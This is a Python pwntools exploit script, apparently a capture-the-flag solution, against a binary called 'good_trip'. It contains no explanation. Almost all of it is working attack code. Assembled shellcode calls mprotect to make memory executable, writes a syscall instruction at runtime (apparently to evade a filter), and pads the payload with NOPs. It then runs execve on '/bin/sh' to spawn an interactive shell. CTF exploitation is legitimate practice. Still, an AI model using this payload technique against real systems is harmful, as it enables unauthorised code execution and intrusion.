#!/usr/bin/python3

from pwn import *

exe = ELF('good_trip', checksec=False)

context.binary = exe

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
sln = lambda msg, num: sla(msg, str(num).encode())
sn = lambda msg, num: sa(msg, str(num).encode())

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b* 0x4011E6 

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process(exe.path)
GDB()

pa = asm(f"""
        mov r13, 0x1337131060
        mov r12, 0x050e
        mov rsp, fs:[0]
        add rsp, 0x1000
        mov rsi, 0x1000
        mov rdx, 0x7
        mov r14, {exe.plt.mprotect}
        call r14
        inc r12
        mov eax, 0x3b
        mov rdi, 0x1337131080
        mov [r13], r12
        xor esi, esi
        xor edx, edx
        """)
pa=pa.ljust(0x80, b'\x90') + b"/bin/sh\x00"
sla(b'>> ', str(0x1000))
sa(b'>> ', pa)

p.interactive()
